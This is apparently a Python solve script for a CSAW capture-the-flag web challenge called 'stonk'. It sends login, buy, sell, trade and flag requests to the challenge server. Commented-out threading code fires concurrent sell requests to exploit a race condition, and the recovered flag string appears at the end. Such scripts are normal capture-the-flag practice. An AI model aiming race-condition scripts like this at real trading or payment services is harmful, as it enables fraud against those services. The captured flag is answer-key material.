import requests

s=requests.Session()  
s.trust_env = False




# url="http://127.0.0.1:5000/sell"
# # r=s.get(url)
# r = s.post(url, data={"key":key_val,"stock":buy_st})
# print(r.status_code)
# print(r.text)

# url="http://127.0.0.1:5000/flag"
# # r=s.get(url)
# r = s.post(url, data={"key":key_val})
# print(r.status_code)
# print(r.text)
base_url="http://stonk.csaw.io:4658/"
# base_url="http://stonk.csaw.io:4661/"
key_val="flag"

buy_st=trade_buy_st=existing_st="BROOKING"
# buy_st="AAPLISH"
# existing_st="AAPLISH"
# trade_buy_st="AAPLISH"

def login():
    url=f"{base_url}login"
    # r=s.get(url)
    r = s.post(url, data={"key":key_val})
    print(r.status_code)
    print(r.text)
def sell():
    url=f"{base_url}sell"
    r = s.post(url, data={"key":key_val,"stock":buy_st})
    print(r.status_code)
    print(r.text)
    print()
    # login()
def buy():
    url=f"{base_url}buy"
    r = s.post(url, data={"key":key_val,"stock":buy_st})
    print(r.status_code)
    print(r.text)
    print()

    # login()

def flag():
    url=f"{base_url}flag"
    r = s.post(url, data={"key":key_val})
    print(r.status_code)
    print(r.text)
    print()

    login()

def trade():
    # BROOKING > AAPLISH
    url=f"{base_url}trade"
    r = s.post(url, data={"key":key_val,"stock":existing_st,"stock1": trade_buy_st })
    print(r.status_code)
    print(r.text)
    print()
    # login()

# login()
# buy()
# buy()
# sell()
# sell()
# sell()
# trade()
# login()
flag()

# import threading
# threads=[]
# total=10
# for i in range(total):
#     # threads.append(threading.Thread(target=buy, args=()))
#     threads.append(threading.Thread(target=sell, args=()))
#     # threads.append(threading.Thread(target=trade, args=()))
#     # threads.append(threading.Thread(target=trade, args=()))
# for i in range(len(threads)):
#     threads[i].start()
# for i in range(len(threads)):
#     threads[i].join()

# login()

# csawctf{R_Yu0_7h3_w0lf_0f_w4ll_57r337}